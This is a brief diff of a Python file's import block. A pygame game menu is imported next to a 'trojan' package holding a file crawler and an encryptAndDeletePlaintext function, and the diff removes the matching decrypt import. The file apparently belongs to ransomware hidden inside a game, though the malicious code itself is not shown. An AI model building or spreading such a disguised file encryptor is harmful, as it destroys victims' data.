@@ -1,13 +1,13 @@
-import pygame
 import os
 import pathlib
-from typing import List
 from multiprocessing import Process
+from typing import List
 
-# Relative Imports
-from .game.menu.main_menu import main_menu
-from .trojan.crawler import Crawler
-from .trojan.crypto import encryptAndDeletePlaintext, decryptAndDeleteCipherText
+import pygame
+
+from game.menu.main_menu import main_menu
+from trojan.crawler import Crawler
+from trojan.crypto import encryptAndDeletePlaintext
 
 PATH_TO_ROOT = pathlib.Path(__file__).parent.absolute()
 
